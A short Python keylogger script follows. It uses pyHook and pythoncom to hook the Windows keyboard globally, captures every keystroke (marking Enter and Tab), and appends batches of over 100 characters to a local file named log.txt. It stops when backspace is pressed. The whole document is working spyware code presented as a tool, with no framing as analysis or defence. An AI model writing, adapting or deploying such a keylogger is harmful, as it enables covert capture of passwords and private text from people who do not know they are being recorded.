
import pyHook, pythoncom, sys, logging

file_log='log.txt'	#To output logged keys
data=''			#To hold logged keys

def OnKeyBoardEvent(event):
	global data
	# logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	# logging.log(10,chr(event.Ascii))
	
	if event.Ascii==8: #Exit on backspace
		exit(1)
	elif event.Ascii==13: #Carraige return representation
		key='<ENTER>'
	elif event.Ascii==9: #TAB Representation
		key='<TAB>'
	else:
		key=chr(event.Ascii)

	data=data+key

	if len(data)>100:
		OutputKeys()
	return True

def OutputKeys(): 
	global data

	f=open('log.txt','a') #Open log file to write keyss
	f.write(data) 
	f.close()
	data=''
	return True

hooks_manager=pyHook.HookManager()     #Create a hook
hooks_manager.KeyDown=OnKeyBoardEvent  #Assign keydown event handler
hooks_manager.HookKeyboard()           #assign hook to the keyboard
pythoncom.PumpMessages()             